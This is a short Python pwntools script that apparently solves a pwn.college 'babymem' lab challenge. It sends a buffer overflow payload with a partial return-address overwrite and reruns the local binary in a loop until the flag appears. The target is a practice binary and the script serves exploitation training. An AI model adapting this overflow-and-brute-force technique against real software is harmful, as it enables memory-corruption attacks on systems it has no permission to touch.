from pwn import *

elf = ELF("/challenge/babymem-level-8-0")
context.log_level = 'error'  

p = elf.process()

payload = b"\x00" + b"A"*135 + b"\x24\x3f"  
p.sendline(f'{len(payload)}'.encode())

while True:
    p = elf.process()
  
    p.sendline(f'{len(payload)}'.encode())

    p.sendline(payload)
    p.recvuntil(b"Goodbye!")
    flag = p.recvall().decode()
    if 'pwn.college' in flag:
        print(flag)
        break
